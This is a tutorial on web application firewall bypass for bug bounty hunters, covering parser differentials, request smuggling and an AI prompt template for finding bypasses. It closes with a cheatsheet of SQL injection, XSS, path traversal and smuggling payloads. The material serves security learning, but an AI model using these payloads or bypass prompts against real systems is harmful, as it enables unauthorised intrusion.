# WAF Bypass: Zero to Hero

Inspired by the React2Shell Vercel WAF bypass research ($170k in bounties, 5 bypasses).
Core concept: **grammar un-equivalence** — WAF and backend parse the same HTTP request differently.

---

## Phase 0: Prerequisites (1-2 days)

Before touching WAF bypass, you need deep HTTP literacy. Most bypasses exploit gaps between RFC specs and real implementations.

### Must-know topics
- **HTTP/1.1 RFC 7230-7235**: Request line, headers, body framing, transfer codings
- **Multipart/form-data (RFC 7578)**: Boundary parsing, content-disposition, nested parts
- **Content-Type & charset handling**: How `charset=` is parsed, MIME type parameters
- **Transfer-Encoding vs Content-Length**: Request smuggling fundamentals
- **URL encoding**: Single vs double encoding, which characters get decoded where
- **Chunked transfer encoding**: How trailers work, chunk extensions

### Practice
```bash
# Read raw HTTP with netcat
printf "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# Experiment with curl's --raw flag
curl --raw -H "Content-Type: multipart/form-data; boundary=X" --data-binary @payload.bin https://target

# Use Caido/Burp Repeater to manually craft malformed requests
```

### Key spec sections to read
- RFC 7230 §3.2 (header field parsing) — duplicate headers, whitespace, OWS
- RFC 7578 §4 (multipart boundary) — what makes a valid boundary
- RFC 2046 §5.1 (multipart syntax) — the original MIME spec, still referenced

---

## Phase 1: Understand the WAF (2-3 days)

### How WAFs work internally
1. **Request arrives** → WAF intercepts before backend
2. **Parse phase**: WAF parses HTTP structure (headers, body, encoding)
3. **Normalize phase**: Decodes, decompresses, normalizes payload
4. **Rule matching**: Applies signatures, regex, ML classifiers
5. **Decision**: Block (403), Allow, or Challenge (CAPTCHA)

### The key insight
Every step above is an opportunity for **differential parsing**.
If step 2 (WAF parsing) differs from how the backend parses, you have a bypass.

### Types of WAFs
| Type | Examples | Weakness |
|------|----------|----------|
| Reverse proxy | Cloudflare, Vercel, Akamai | Ordering of header processing |
| ModSecurity | AWS WAF, custom Apache/Nginx | Rule language limitations, DoS |
| Application-level | Next.js middleware, Django middleware | Framework-specific parsing quirks |
| NGINX-based | Custom corporate WAFs | Low-level C parsing edge cases |

### Learn to fingerprint WAFs
```bash
# Basic detection
curl -sI https://target | grep -iE 'cf-ray|akamai|cloudfront|vercel|x-sucuri'

# Active probing — send obviously malicious payloads and study response differences
curl -H "X-Forwarded-For: 127.0.0.1' OR '1'='1" https://target
```

---

## Phase 2: The Bypass Technique Catalog (1 week)

Organized by which part of HTTP parsing gets exploited.

### Category A: Header Parsing Differentials

#### A1 — Duplicate Headers
```
Content-Type: multipart/form-data; boundary=x
Content-Type: multipart/form-data; boundary=y
```
WAF sees first, backend sees last (or vice versa depending on implementation).

#### A2 — Header Name Case Variations
```
content-type: ...   (lowercase, WAF might miss)
Content-type: ...   (mixed case, some parsers are strict)
```

#### A3 — Whitespace Injection
```
Content-Type : multipart/form-data; boundary=x
Content-Type:  multipart/form-data; boundary=x
\tContent-Type: multipart/form-data; boundary=x
```
Some WAFs require exact format; backends are more lenient.

#### A4 — Obfuscated Host Header
```
Host: target.com
Host: evil.com           (which one does WAF use?)
Host: target.com@evil.com
```

### Category B: Body Parsing Differentials

#### B1 — Boundary Tricks (the React2Shell techniques)
```
Content-Type: multipart/form-data; boundary=y; boundary=x
Content-Type: multipart/form-data; boundary="x"
Content-Type: multipart/form-data; boundary= x
Content-Type: multipart/form-data; boundary=x y
```

#### B2 — Content-Length Mismatches
```
Content-Length: 5
Content-Length: 500

Body: GET /admin (5 bytes, WAF stops here; backend reads full 500)
```

#### B3 — Chunked Encoding Abuse
```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked    (some backends accept this)

Transfer-Encoding: chunked
Transfer-Encoding: identity    (smuggling)
```

#### B4 — Trailing Boundary Space (React2Shell Bypass 5)
```
--y--   (with trailing space — WAF thinks stream ended)
--y
actual payload here
--y--
```
WAF stops parsing at the first `--y--`; backend keeps going.

### Category C: Character Encoding Differentials

#### C1 — Null Bytes
```
GET /admin%00.html HTTP/1.1
```
WAF sees `.html` extension (allowed); backend truncates at null → hits `/admin`.

#### C2 — Unicode Normalization
```
GET /%C0%AE%C0%AE%C0%AFetc/passwd HTTP/1.1
```
Overlong UTF-8 encoding of `.` and `/` — WAF doesn't normalize; backend does.

#### C3 — UTF-16/UTF-7 Encoding
```
Content-Type: text/plain; charset=utf-16le
```
WAF scans raw bytes (sees nothing); backend decodes from UTF-16 (sees payload).
This was React2Shell Bypass 3.

#### C4 — Double URL Encoding
```
%252e%252e%252f  →  %2e%2e%2f  →  ../
```
WAF decodes once, normalizes; backend decodes again.

#### C5 — Unicode Normalization (NFKC/NFKD)
```
﹒ (small full stop, U+FE52) → normalizes to . (U+002E)
／ (fullwidth solidus, U+FF0F) → normalizes to / (U+002F)
```

### Category D: Method & Protocol Manipulation

#### D1 — HTTP Method Override
```
POST /safe-endpoint HTTP/1.1
X-HTTP-Method-Override: DELETE
```

#### D2 — HTTP Version Confusion
```
GET /admin HTTP/0.9    (no headers — some WAFs expect Host header)
```

#### D3 — Absolute URI in Request Line
```
GET https://evil.com/admin HTTP/1.1
Host: target.com
```
WAF sees Host header (target.com, allowed); proxies to evil.com.

### Category E: Protocol-Level Smuggling

#### E1 — CL.TE Smuggling
```
Content-Length: 6
Transfer-Encoding: chunked

0

G     (smuggled request prefix)
```

#### E2 — TE.CL Smuggling
```
Transfer-Encoding: chunked
Content-Length: 4

1
A
0
```
WAF uses Content-Length (4 bytes); backend uses chunked (different interpretation).

#### E3 — H2.CL / H2.TE Desync
HTTP/2 to HTTP/1.1 downgrade injects `Content-Length: <actual>` which can conflict with injected headers.

---

## Phase 3: Hands-On Lab Setup (1 day)

### Option A: ModSecurity locally
```bash
# Docker-based ModSecurity + CRS
docker pull owasp/modsecurity-crs:apache
docker run -p 8080:80 owasp/modsecurity-crs:apache

# Test detection
curl 'http://localhost:8080/?q=<script>alert(1)</script>'

# Now start crafting bypasses
```

### Option B: Cloudflare development mode
- Set up a free Cloudflare account
- Point a test domain at any origin server
- Put Cloudflare in "Development Mode" to test bypasses without rate limits
- Then test against production mode

### Option C: Custom lab for specific techniques
```python
# flask_backend.py — realistic backend that parses multipart
from flask import Flask, request
app = Flask(__name__)

@app.route('/api/upload', methods=['POST'])
def upload():
    # Uses Python's cgi.FieldStorage — different parser than WAF
    file = request.files.get('file')
    # ... process request
    return "ok"
```

### Option D: Caido Automate for fuzzing
Use Caido's fuzzing engine to iterate through bypass payloads:
1. Create a session with your target request
2. Load bypass wordlists as payloads
3. Compare response codes/body lengths for anomalies

---

## Phase 4: AI-Assisted WAF Bypass (2-3 days)

This is the cutting edge — using LLMs to find parsing differentials.

### Approach 1: White-Box (most effective)
If you have access to WAF source/config:
1. Feed the WAF's HTTP parsing code to the AI
2. Feed the backend framework's HTTP parsing code
3. Ask: "Find inputs where these two parsers produce different results"

### Approach 2: Grey-Box (practical for bug bounty)
1. Fingerprint the WAF (Cloudflare, Vercel, AWS)
2. Know the backend (Next.js, Express, Flask, Rails)
3. Feed AI: "I have a Cloudflare WAF in front of a Next.js backend. The Next.js version is 15.x. Find header/body parsing differentials."
4. Use the published RFCs for both parsers

### Approach 3: Black-Box (hardest, but possible)
1. Send probe requests with various edge cases
2. Map where WAF blocks vs allows
3. Feed the pattern of blocks/allows to AI
4. Ask AI to hypothesize what parsing logic explains the pattern
5. Generate payloads that exploit that hypothesized logic

### AI Prompt Template for Bypass Discovery
```
I'm testing a WAF bypass. Here's the setup:

WAF: [Cloudflare / Vercel / AWS WAF / ModSecurity with CRS 4.x]
Backend: [Next.js 15.x / Express 4.x / Django 5.x / Rails 7.x]
Target endpoint: POST /api/upload
Content-Type: multipart/form-data
Payload I want to deliver: [malicious payload here]

The WAF currently blocks:
[show blocked request]

What parser differentials exist between [WAF parser] and [backend parser] 
that I can exploit to deliver this payload?
```

### Key AI Insight from the React2Shell research
The researchers found that **Gemini 2.5 Pro could reproduce all 5 bypasses when given white-box access** to the WAF source. This means:
- AI is good at spotting parser differentials when it can see both parsers
- AI is weak at black-box guessing — you need to do the reconnaissance first
- **Your job**: map out both parsers → **AI's job**: find the mismatch

---

## Phase 5: Practical Workflow for Bug Bounty (ongoing)

### Step 1: Reconnaissance
```
1. Fingerprint WAF → what technology?
2. Fingerprint backend → what framework + version?
3. Map endpoints that accept user input (uploads, JSON, XML, GraphQL, form POSTs)
4. For each endpoint, identify the Content-Type it accepts
```

### Step 2: Initial Probing
```
For each endpoint, send payloads that test parser edge cases:
1. Duplicate headers (Content-Type, Content-Length, Transfer-Encoding)
2. Content-Type variations (charset, boundary spacing, quotes)
3. Encoding tricks (null bytes, double encoding, unicode normalization)
4. Method confusion (HEAD instead of GET, OPTIONS)
```

### Step 3: Differential Analysis
```
Compare: "what does WAF block?" vs "what does backend accept?"
If discrepancy found → develop bypass payload
```

### Step 4: Weaponization
```
Once bypass is found:
1. Combine with actual vulnerability (RCE, SQLi, XSS, SSRF)
2. Test full chain: bypass + exploit payload
3. Document both bypass and underlying vuln
```

### Step 5: Submission Strategy
```
- Report the underlying vulnerability (not just the bypass)
- The bypass is an addendum that increases severity
- Show impact: "Without WAF bypass, this is a medium. With bypass, critical."
```

---

## Cheatsheet: Quick Bypass Payloads to Try

### Content-Type
```
Content-Type: multipart/form-data; boundary=X; boundary=Y
Content-Type: multipart/form-data; boundary="X"
Content-Type: multipart/form-data; boundary= X
Content-Type: text/html; charset=utf-16le
Content-Type: application/x-www-form-urlencoded ; charset=utf-8
Content-Type[0]: multipart/form-data
```

### Path Traversal WAF Bypass
```
/../admin           → simple, usually blocked
/..;/admin          → semicolon bypass (Tomcat, Jetty)
/..%252fadmin       → double encoding
/%2e%2e%2fadmin     → single encoding
/..\/admin          → backslash (Windows/IIS)
/....//....//admin  → normalization bypass
```

### SQLi Keyword Bypass
```
' OR '1'='1         → blocked
' || 1=1--          → OR replacement
' /*!OR*/ 1=1--     → MySQL comment inside keyword
' OR 1 LIKE 1--     → operator variation
```

### XSS Tag Bypass
```
<script>alert(1)</script>       → blocked
<scr<script>ipt>alert(1)</scr</script>ipt>  → nested tag
<img src=x onerror=alert(1)>    → img vector
<svg/onload=alert(1)>           → svg vector
```

---

## Resources

### Tools
- **Caido Automate** — fuzzing engine for iterating bypass payloads
- **Burp Intruder** — payload positions + encoding options
- **http-request-smuggler** (Burp extension) — CL.TE/TE.CL testing
- **telerik-fiddler** — WAF detection + bypass suggestion tool
- **wafw00f** — WAF fingerprinting CLI tool
- **whatwaf** — Another WAF detection tool with bypass suggestions

### Wordlists
- `/usr/share/seclists/Fuzzing/WAF-Bypass-*` (if you have SecLists)
- Build your own from this cheatsheet

### Papers & Talks
- "Exploiting Parser Differential" — Orange Tsai (Black Hat)
- "HTTP Desync Attacks" — James Kettle (PortSwigger Research)
- "The WAF of Theseus" — Zac Sims (BSides)
- "Bypassing WAFs with HTTP Grammar" — Philippe Arteau (GoSecure)

### Labs
- PortSwigger Web Security Academy (smuggling + WAF labs)
- OWASP CRS Sandbox (https://coreruleset.org)
- Defend the Web (WAF bypass challenges)

---

## Your Learning Path (Suggested Schedule)

| Week | Focus | Output |
|------|-------|--------|
| 1 | HTTP deep dive + read RFCs + set up ModSecurity lab | Can manually craft malformed HTTP |
| 2 | Category A-D techniques + reproduce each bypass on lab | 10+ verified bypass payloads |
| 3 | Protocol smuggling (CL.TE, TE.CL, H2.CL) | Can chain smuggling + vuln |
| 4 | AI-assisted discovery — feed WAF+backend source to AI | 3+ novel bypasses |
| 5+ | Apply to bug bounty targets | First WAF-bypassed submission |
